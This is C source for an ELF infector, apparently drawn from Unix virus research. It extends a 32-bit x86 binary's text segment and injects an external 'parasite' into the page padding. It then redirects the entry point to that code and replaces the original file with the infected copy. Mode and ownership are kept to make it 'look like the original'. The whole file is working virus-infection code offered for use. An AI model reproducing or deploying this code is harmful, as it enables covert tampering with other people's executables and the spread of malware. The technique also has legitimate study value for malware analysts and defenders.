   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <sys/types.h>
   #include <sys/stat.h>
   #include <string.h>
   #include <fcntl.h>
   #include <unistd.h>
   #include <elf.h>

   #define PAGE_SIZE   4096

   /* these are declared in parasite.c */

   extern char parasite[];
   extern int plength;
   extern long hentry;
   extern long entry;

   void copy_partial(int fd, int od, unsigned int len)
   {
       char idata[PAGE_SIZE];
       unsigned int n = 0;
       int r;

       while (n + PAGE_SIZE < len) {
           if (read(fd, idata, PAGE_SIZE) != PAGE_SIZE) {;
               perror("read");
               exit(1);
           }

           if (write(od, idata, PAGE_SIZE) < 0) {
               perror("write");
               exit(1);
           }

           n += PAGE_SIZE;
       }

       r = read(fd, idata, len - n);
       if (r < 0) {
           perror("read");
           exit(1);
       }

       if (write(od, idata, r) < 0) {
           perror("write");
           exit(1);
       }
   }

   void infect_elf(char *filename, char *v, int len, int he, int e)
   {
       Elf32_Shdr *shdr;
       Elf32_Phdr *phdr;
       Elf32_Ehdr ehdr;
       int i;
       int offset, oshoff, pos;
       int evaddr;
       int slen, plen;
       int fd, od;
       char *sdata, *pdata;
       char idata[PAGE_SIZE];
       char tmpfilename[] = "infect-elf-p.tmp";
       struct stat stat;

       fd = open(filename, O_RDONLY);
       if (fd < 0) {
           perror("open");
           exit(1);
       }

   /* read the ehdr */

       if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
           perror("read");
           exit(1);
       }

   /* ELF checks */

       if (strncmp(ehdr.e_ident, ELFMAG, SELFMAG)) {
           fprintf(stderr, "File not ELF\n");
           exit(1);
       }

       if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) {
           fprintf(stderr, "ELF type not ET_EXEC or ET_DYN\n");
           exit(1);
       }

       if (ehdr.e_machine != EM_386 && ehdr.e_machine != EM_486) {
           fprintf(stderr, "ELF machine type not EM_386 or EM_486\n");
           exit(1);
       }

       if (ehdr.e_version != EV_CURRENT) {
           fprintf(stderr, "ELF version not current\n");
           exit(1);
       }

   /* modify the parasite so that it knows the correct re-entry point */

       printf(
           "Parasite length: %i, "
           "Host entry point index: %i, "
           "Entry point offset: %i"
           "\n",
           len, he, e
       );
       printf("Host entry point: 0x%x\n", ehdr.e_entry);
       *(int *)&v[he] = ehdr.e_entry;

   /* allocate memory for phdr tables */

       pdata = (char *)malloc(plen = sizeof(*phdr)*ehdr.e_phnum);
       if (pdata == NULL) {
           perror("malloc");
           exit(1);
       }

   /* read the phdr's */

       if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
           perror("lseek");
           exit(1);
       }

       if (read(fd, pdata, plen) != plen) {
           perror("read");
           exit(1);
       }

   /*
       update the phdr's to reflect the extention of the text segment (to
       allow virus insertion)
   */

       offset = 0;

       for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
           if (offset) {
               phdr->p_offset += PAGE_SIZE;
           } else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
   /* is this the text segment ? */
               int plen;

               if (phdr->p_filesz != phdr->p_memsz) {
                   fprintf(
                       stderr,
                       "filesz = %i memsz = %i\n",
                       phdr->p_filesz, phdr->p_memsz
                   );
                   exit(1);
               }

               evaddr = phdr->p_vaddr + phdr->p_filesz;
               plen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));

               printf("Padding length: %i\n", plen);

               if (plen < len) {
                   fprintf(stderr, "Parasite too large\n");
                   exit(1);
               }

               ehdr.e_entry = evaddr + e;
               printf("New entry point: 0x%x\n", ehdr.e_entry);

               offset = phdr->p_offset + phdr->p_filesz;

               printf("Parasite file offset: %i\n", offset);

               phdr->p_filesz += len;
               phdr->p_memsz += len;
           }

           ++phdr;
       }

       if (offset == 0) {
           fprintf(stderr, "No text segment?");
           exit(1);
       }

   /* allocated memory if required to accomodate the shdr tables */

       sdata = (char *)malloc(slen = sizeof(*shdr)*ehdr.e_shnum);
       if (sdata == NULL) {
           perror("malloc");
           exit(1);
       }

   /* read the shdr's */

       if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
           perror("lseek");
           exit(1);
       }

       if (read(fd, sdata, slen) != slen) {
           perror("read");
           exit(1);
       }

   /* update the shdr's to reflect the insertion of the parasite */

       for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
           if (shdr->sh_offset >= offset) {
               shdr->sh_offset += PAGE_SIZE;
           } else if (shdr->sh_addr + shdr->sh_size == evaddr) {
   /* is this the last text section ? */
               shdr->sh_size += len;
           }

                   ++shdr;
           }

   /* update ehdr to reflect new offsets */

       oshoff = ehdr.e_shoff;
       if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

   /* insert the parasite */

       if (fstat(fd, &stat) < 0) {
           perror("fstat");
           exit(1);
       }

       od = open(tmpfilename, O_WRONLY | O_CREAT | O_TRUNC, stat.st_mode);
       if (od < 0) {
           perror("write");
           exit(1);
       }


   /* Reconstruct a copy of the ELF file with the parasite */

       if (lseek(fd, 0, SEEK_SET) < 0) {
           perror("lseek");
           exit(1);
       }

       if (write(od, &ehdr, sizeof(ehdr)) < 0) {
           perror("write");
           exit(1);
       }

       if (write(od, pdata, plen) < 0) {
           perror("write");
           exit(1);
       }
       free(pdata);

       if (lseek(fd, pos = sizeof(ehdr) + plen, SEEK_SET) < 0) {
           perror("lseek");
           exit(1);
       }

       copy_partial(fd, od, offset - pos);

       if (write(od, v, len) < 0) {
           perror("write");
           exit(1);
       }

       memset(idata, PAGE_SIZE - len, 0);

       if (write(od, idata, PAGE_SIZE - len) < 0) {
           perror("write");
           exit(1);
       }

       copy_partial(fd, od, oshoff - offset);

       if (write(od, sdata, slen) < 0) {
           perror("write");
           exit(1);
       }
       free(sdata);

       if (lseek(fd, pos = oshoff + slen, SEEK_SET) < 0) {
           perror("lseek");
           exit(1);
       }

       copy_partial(fd, od, stat.st_size - pos);

   /* Make the parasitic ELF the real one */

       if (rename(tmpfilename, filename) < 0) {
           perror("rename");
           exit(1);
       }

   /* Make it look like thr original */

       if (fchmod(od, stat.st_mode) < 0) {
           perror("chmod");
           exit(1);
       }

       if (fchown(od, stat.st_uid, stat.st_gid) < 0) {
           perror("chown");
           exit(1);
       }

   /* All done */

       printf("Infection Done\n");
   }

   int main(int argc, char *argv[])
   {
       if (argc != 2) {
           fprintf(stderr, "usage: infect-elf host parasite\n");
           exit(1);
       }

       infect_elf(argv[1], parasite, plength, hentry, entry);

       exit(0);
   }
